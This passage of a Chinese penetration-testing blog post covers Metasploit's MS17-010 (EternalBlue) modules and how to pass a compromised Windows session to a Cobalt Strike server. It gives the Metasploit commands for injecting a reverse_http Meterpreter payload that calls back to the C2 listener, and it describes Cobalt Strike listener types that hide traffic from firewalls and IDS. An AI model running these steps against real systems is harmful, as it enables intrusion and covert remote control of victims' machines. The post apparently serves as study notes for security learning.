class="hljs-string">---------------</span>  <span class="hljs-string">----</span>     <span class="hljs-string">-----</span>  <span class="hljs-string">-----------</span><br>   <span class="hljs-number">0</span>   <span class="hljs-string">exploit/windows/smb/ms17_010_eternalblue</span>       <span class="hljs-number">2017-03-14       </span><span class="hljs-string">average</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">MS17-010</span> <span class="hljs-string">EternalBlue</span> <span class="hljs-string">SMB</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kernel</span> <span class="hljs-string">Pool</span> <span class="hljs-string">Corruption</span><br>   <span class="hljs-number">1</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Automatic</span> <span class="hljs-string">Target</span>                  <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">2</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">7</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">3</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Embedded</span> <span class="hljs-string">Standard</span> <span class="hljs-number">7</span>       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">4</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">R2</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">5</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">8</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">6</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">8.1</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">7</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">8</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-string">Pro</span>                    <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">9</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-string">Enterprise</span> <span class="hljs-string">Evaluation</span>  <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">10</span>  <span class="hljs-string">exploit/windows/smb/ms17_010_psexec</span>            <span class="hljs-number">2017-03-14       </span><span class="hljs-string">normal</span>   <span class="hljs-literal">Yes</span>    <span class="hljs-string">MS17-010</span> <span class="hljs-string">EternalRomance/EternalSynergy/EternalChampion</span> <span class="hljs-string">SMB</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Code</span> <span class="hljs-string">Execution</span><br>   <span class="hljs-number">11</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Automatic</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">12</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PowerShell</span>                        <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">13</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Native</span> <span class="hljs-string">upload</span>                     <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">14</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">MOF</span> <span class="hljs-string">upload</span>                        <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">15</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALSYNERGY</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">16</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALROMANCE</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">17</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALCHAMPION</span>                      <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">18</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALBLUE</span>                          <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">19</span>  <span class="hljs-string">auxiliary/admin/smb/ms17_010_command</span>           <span class="hljs-number">2017-03-14       </span><span class="hljs-string">normal</span>   <span class="hljs-literal">No</span>     <span class="hljs-string">MS17-010</span> <span class="hljs-string">EternalRomance/EternalSynergy/EternalChampion</span> <span class="hljs-string">SMB</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Execution</span><br>   <span class="hljs-number">20</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALSYNERGY</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">21</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALROMANCE</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">22</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALCHAMPION</span>                      <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">23</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALBLUE</span>                          <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">24</span>  <span class="hljs-string">auxiliary/scanner/smb/smb_ms17_010</span>             <span class="hljs-string">.</span>                <span class="hljs-string">normal</span>   <span class="hljs-literal">No</span>     <span class="hljs-string">MS17-010</span> <span class="hljs-string">SMB</span> <span class="hljs-string">RCE</span> <span class="hljs-string">Detection</span><br>   <span class="hljs-number">25</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">DOUBLEPULSAR</span>                         <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">26</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">AKA:</span> <span class="hljs-string">ETERNALBLUE</span>                          <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">27</span>  <span class="hljs-string">exploit/windows/smb/smb_doublepulsar_rce</span>       <span class="hljs-number">2017-04-14       </span><span class="hljs-string">great</span>    <span class="hljs-literal">Yes</span>    <span class="hljs-string">SMB</span> <span class="hljs-string">DOUBLEPULSAR</span> <span class="hljs-string">Remote</span> <span class="hljs-string">Code</span> <span class="hljs-string">Execution</span><br>   <span class="hljs-number">28</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Execute</span> <span class="hljs-string">payload</span> <span class="hljs-string">(x64)</span>             <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">29</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Neutralize</span> <span class="hljs-string">implant</span>                <span class="hljs-string">.</span>                <span class="hljs-string">.</span>        <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <br><span class="hljs-number">1</span><span class="hljs-string">.先来说说各个模块的意思</span><br><span class="hljs-string">Name</span>	<span class="hljs-string">模块名称（如</span> <span class="hljs-string">ms17_010_eternalblue）</span><br><span class="hljs-string">Disclosure</span> <span class="hljs-string">Date</span>	<span class="hljs-string">漏洞公开日期（2017-03-14</span> <span class="hljs-string">对应</span> <span class="hljs-string">MS17-010</span> <span class="hljs-string">补丁日）</span><br><span class="hljs-string">Rank</span>	<span class="hljs-string">模块稳定性评级：</span><br>		<span class="hljs-bullet">-</span> <span class="hljs-string">average/great（高成功率）</span><br>		<span class="hljs-bullet">-</span> <span class="hljs-string">normal（需特定条件）</span><br><span class="hljs-string">Check</span>	<span class="hljs-string">是否支持漏洞检测（Yes</span> <span class="hljs-string">表示模块自带检测逻辑，No</span> <span class="hljs-string">需手动验证）。</span><br><span class="hljs-string">Description</span>	<span class="hljs-string">模块功能简介（如攻击原理或检测能力）。</span><br><br><br><span class="hljs-number">2</span><span class="hljs-string">.然后是具体的模块的分类以及名称</span><br>			<span class="hljs-string">exploit/windows/smb/ms17_010_eternalblue</span>	<span class="hljs-string">利用永恒之蓝漏洞（EternalBlue）攻击未打补丁的</span> <span class="hljs-string">Windows</span> <span class="hljs-string">系统，漏洞利用类</span>											 <span class="hljs-string">触发内核级远程代码执行（RCE）。</span><br>		    <span class="hljs-string">exploit/windows/smb/ms17_010_psexec</span>	<span class="hljs-string">利用EternalRomance/Synergy/Champion漏洞通过SMB服务上传并执行恶意负载</span><br>		    <br><span class="hljs-string">辅助利用类</span>	<span class="hljs-string">auxiliary/admin/smb/ms17_010_command</span>	<span class="hljs-string">在已验证漏洞存在时，直接通过</span> <span class="hljs-string">SMB</span> <span class="hljs-string">执行系统命令（无需上传</span> <span class="hljs-string">Payload）</span><br><span class="hljs-string">漏洞扫描类</span>	<span class="hljs-string">auxiliary/scanner/smb/smb_ms17_010</span>	<span class="hljs-string">检测目标是否受</span> <span class="hljs-string">MS17-010</span> <span class="hljs-string">漏洞影响（支持批量扫描）。</span><br><span class="hljs-string">双星后门利用类</span>	<span class="hljs-string">exploit/windows/smb/smb_doublepulsar_rce</span>	<span class="hljs-string">利用</span> <span class="hljs-string">DOUBLEPULSAR</span> <span class="hljs-string">后门（植入后）执行代码或清除后门。</span><br><br><br><span class="hljs-number">3</span><span class="hljs-string">.最后是</span><br><span class="hljs-string">（1）目标选项（Target）</span><br><span class="hljs-string">作用：指定目标操作系统版本或攻击模式，确保</span> <span class="hljs-string">Payload</span> <span class="hljs-string">兼容性。</span><br><span class="hljs-string">用法：若攻击Windows</span> <span class="hljs-number">7</span><span class="hljs-string">，需指定set</span> <span class="hljs-string">target</span> <span class="hljs-number">2</span><span class="hljs-string">（对应Windows</span> <span class="hljs-number">7</span><span class="hljs-string">条目）。</span><br><span class="hljs-string">示例：</span><br><span class="hljs-string">Windows</span> <span class="hljs-number">7</span><span class="hljs-string">：针对</span> <span class="hljs-string">Win7</span> <span class="hljs-string">系统优化攻击链。</span><br><span class="hljs-string">PowerShell：通过</span> <span class="hljs-string">PowerShell</span> <span class="hljs-string">上传和执行</span> <span class="hljs-string">Payload。</span><br><span class="hljs-string">Neutralize</span> <span class="hljs-string">implant：清除</span> <span class="hljs-string">DOUBLEPULSAR</span> <span class="hljs-string">后门。</span><br><span class="hljs-string">（2）别名（AKA）</span><br><span class="hljs-string">含义：模块关联的漏洞别名或攻击代号。</span><br><span class="hljs-string">用法：通过set</span> <span class="hljs-string">AKA</span> <span class="hljs-string">ETERNALROMANCE可切换利用链中的不同攻击逻辑</span><br><span class="hljs-string">ETERNALBLUE：永恒之蓝（内核漏洞）。</span><br><span class="hljs-string">DOUBLEPULSAR：NSA</span> <span class="hljs-string">泄露的后门工具，与</span> <span class="hljs-string">EternalBlue</span> <span class="hljs-string">配合使用。</span><br></code></pre></td></tr></table></figure>
+
+<p>首先使用msf利用永恒之蓝的漏洞get到回连的shell如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182037898.png" srcset="/img/loading.gif" lazyload alt="image-20250218203752585"></p>
+<p>然后使用background先将其放到后台然后可以使用sessions -l来查看会话id</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182042377.png" srcset="/img/loading.gif" lazyload alt="image-20250218204241276"></p>
+<p>然后进行注入会话（注意如果要实现以下这些功能的话是需要你去<strong>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</strong>而不是以上图片中的）<br>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject  这个模块是一个 Windows 本地漏洞利用模块，它允许你注入一个有效的 payload 到目标系统。       				这个模块通常用于通过本地权限提升攻击进行绕过限制并获得更高权限。它可以通过注入 payload 来逃避一些本地防护措施。</p>
+<p>session 选择要复制的session会话id<br>set payload windows&#x2F;meterpreter&#x2F;reverse_http<br>set lhost cs服务器地址<br>set lport cs外联监听器的端口(此处应为4442)</p>
+<p>CS创建监听器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182110235.png" srcset="/img/loading.gif" lazyload alt="image-20250218211031149"></p>
+<p>MSF运行注入run</p>
+<p>然后再cs上即可返回到会话</p>
+<h2 id="CS监听器的原理"><a href="#CS监听器的原理" class="headerlink" title="CS监听器的原理"></a>CS监听器的原理</h2><p><strong>Beacon类</strong>：</p>
+<ul>
+<li>通常用于标准的渗透测试，使用常见的通信协议（如HTTP、HTTPS、DNS等）与C2进行通信。</li>
+<li>适用于大多数网络环境，并能够通过加密、定时轮询等方式隐蔽流量。（轮询是指目标计算机上的beacon会周期性的向c2服务区发送请求 检查是否有新的指令或者数据 [其中的周期性在cobaltstrike就是sleep 设置的心跳] ）</li>
+</ul>
+<p><strong>External类</strong>：</p>
+<ul>
+<li>使用外部协议或自定义协议，与外部C2服务器进行通信。</li>
+<li>主要用于规避网络监控，适合对抗先进的防火墙和IDS系统。</li>
+</ul>
+<p><strong>Foreign类</strong>：</p>
+<ul>
+<li>专注于通过模仿外部流量（如外部的HTTP&#x2F;HTTPS请求）来伪装Cobalt Strike的C2流量。</li>
+<li>适用于需要极高隐蔽性和绕过基于流量模式检测的场景。</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CobaltStrike的使用</div>
+      <div>http://example.com/2024/11/16/CobaltStrike的使用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/02/19/%E7%A5%A8%E6%8D%AE%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/" title="票据及其相关的工作原理">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">票据及其相关的工作原理</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/14/CVE-2021-44228%E5%A4%8D%E7%8E%B0/" title="CVE-2021-44228复现">
+                        <span class="hidden-mobile">CVE-2021-44228复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","appKey":"rQPg4V1fSy3hOP8QAyeJnyh8","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
